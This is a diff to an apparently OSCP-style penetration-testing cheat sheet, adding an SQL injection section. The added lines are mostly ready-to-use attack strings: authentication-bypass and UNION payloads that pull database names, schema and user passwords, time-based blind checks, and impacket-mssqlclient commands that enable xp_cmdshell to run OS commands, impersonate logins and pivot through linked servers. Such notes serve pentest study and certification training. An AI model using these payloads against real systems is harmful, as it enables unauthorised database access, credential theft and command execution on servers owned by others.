@@ -99,6 +99,36 @@ Curated from the OSCP Assessment Template with added quick wins for both Linux a
 - Command Injection
   - `http://<target>/index.php?page=ping&ip=
   - find exploitable parameter in the web request that passes user input to system commands.
+- SQL injection
+    - payloads
+    ```bash
+    admin' OR 1=1 -- //
+    ' ORDER BY 1-- //
+    %' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
+    %' UNION SELECT database(), user(), @@version, null, null -- //
+    ' UNION SELECT null, null, database(), user(), @@version  -- //
+    ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+    ' UNION SELECT null, username, password, description, null FROM users -- //
+    AND 1=1 -- //
+    AND IF (1=1, sleep(3),'false') -- //
+    ```
+    - impacket-mssqlclient
+    ```bash
+    kali@kali:~$ impacket-mssqlclient -windows-auth -target-ip
+    enable_xp_cmdshell  -- To enable xp_cmdshell
+    xp_cmdshell 'whoami'  -- To execute command
+    
+    enum_users  -- To enumerate users
+    enum_impersonate -- Check for impersonation possibilities
+    exec_as_login <login_name>  -- To impersonate a login
+
+    enum_links -- To enumerate linked servers
+    use_link <linked_server_name>  -- To use linked server
+    ```
+
+    
+
+
 ## Host Enumeration – Linux
 - `uname -a` – Kernel and architecture info.
 - `hostnamectl` – Hostname, OS, and hardware summary.
